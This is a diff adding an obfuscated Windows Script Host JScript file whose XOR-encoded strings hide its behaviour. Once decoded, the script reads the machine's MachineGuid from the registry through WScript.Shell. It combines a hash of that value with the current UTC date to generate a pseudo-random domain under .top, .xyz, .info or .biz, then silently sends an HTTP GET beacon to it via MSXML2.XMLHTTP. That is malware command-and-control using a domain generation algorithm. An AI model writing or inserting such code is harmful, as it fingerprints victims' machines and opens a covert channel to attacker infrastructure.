@@ -1,0 +1,77 @@
+var T = [
+    "\x3d\x3f\x2e\x0f\x0e\x19\x1c\x2f\x36\x36\x03\x3f\x3b\x28",
+    "\x3d\x3f\x2e\x0f\x0e\x19\x17\x35\x34\x2e\x32",
+    "\x3d\x3f\x2e\x0f\x0e\x19\x1e\x3b\x2e\x3f",
+    "\x74\x2e\x35\x2a",
+    "\x74\x22\x23\x20",
+    "\x74\x33\x34\x3c\x35",
+    "\x74\x38\x33\x20",
+    "\x17\x09\x02\x17\x16\x68\x74\x02\x17\x16\x12\x0e\x0e\x0a",
+    "\x35\x2a\x3f\x34",
+    "\x1d\x1f\x0e",
+    "\x32\x2e\x2e\x2a\x60\x75\x75",
+    "\x75\x39",
+    "\x29\x3f\x34\x3e",
+    "\x33\x37\x2f\x36",
+    "\x17\x3b\x2e\x32",
+    "\x1e\x3b\x2e\x3f",
+    "\x0b\x2f\x33\x2e",
+    "\x28\x3f\x2e\x2f\x28\x34\x7a\x2e\x32\x33\x29",
+    "\x0d\x09\x39\x28\x33\x2a\x2e",
+    "\x09\x39\x28\x33\x2a\x2e\x14\x3b\x37\x3f",
+    "\x1b\x39\x2e\x33\x2c\x3f\x02\x15\x38\x30\x3f\x39\x2e",
+    "\x0d\x09\x39\x28\x33\x2a\x2e\x74\x09\x32\x3f\x36\x36",
+    "\x08\x3f\x3d\x08\x3f\x3b\x3e",
+    "\x12\x11\x16\x17\x06\x09\x15\x1c\x0e\x0d\x1b\x08\x1f\x06\x17\x33\x39\x28\x35\x29\x35\x3c\x2e\x06\x19\x28\x23\x2a\x2e\x35\x3d\x28\x3b\x2a\x32\x23\x06\x17\x3b\x39\x32\x33\x34\x3f\x1d\x2f\x33\x3e",
+    "\x2e\x35\x16\x35\x2d\x3f\x28\x19\x3b\x29\x3f",
+    "\x36\x3f\x34\x3d\x2e\x32",
+    "\x39\x32\x3b\x28\x19\x35\x3e\x3f\x1b\x2e",
+    "\x3c\x28\x35\x37\x19\x32\x3b\x28\x19\x35\x3e\x3f"
+];
+(function (a, n) {
+    while (n--) a.push(a.shift());
+})(T, 0x11);
+function D(i) {
+    var e = T[i - 0x3e1], o = "", k;
+    for (k = 0; k < e.length; k++) o += String.fromCharCode(e.charCodeAt(k) ^ 0x5a);
+    return o;
+}
+var G = Function(D(0x3e1))();
+var M = G[D(0x3fa)], B = G[D(0x3e2)];
+function h(t) {
+    var x = 0, i;
+    for (i = 0; i < t[D(0x3e9)]; i++) x = (M[D(0x3f9)](x, 31) + t[D(0x3ea)](i)) | 0;
+    return x;
+}
+function gen(w, g, f) {
+    var o = "3|0|4|1|2".split("|"), p = 0, s, n, r = "", k, T;
+    while (true) {
+        switch (o[p++]) {
+            case "0":
+                s = (h(g[D(0x3e8)]()) ^ h(f)) >>> 0;
+                continue;
+            case "1":
+                s = (s ^ n) >>> 0;
+                continue;
+            case "2":
+                for (k = 0; k < 12; k++) {
+                    s = (M[D(0x3f9)](s, 1103515245) + 12345) & 0x7fffffff;
+                    r += String[D(0x3eb)](97 + ((s >>> 16) % 26));
+                }
+                return r + T[s % 4];
+            case "3":
+                T = [D(0x3ef), D(0x3f0), D(0x3f1), D(0x3f2)];
+                continue;
+            case "4":
+                n = w[D(0x3ec)]() * 10000 + (w[D(0x3ed)]() + 1) * 100 + w[D(0x3ee)]();
+                continue;
+        }
+        break;
+    }
+}
+var sh = new G[D(0x3e4)](D(0x3e5));
+var guid = sh[D(0x3e6)](D(0x3e7));
+var dom = gen(new G[D(0x3fb)](), guid, B[D(0x3e3)]);
+var q = new G[D(0x3e4)](D(0x3f3));
+q[D(0x3f4)](D(0x3f5), D(0x3f6) + dom + D(0x3f7), false);
+q[D(0x3f8)]();
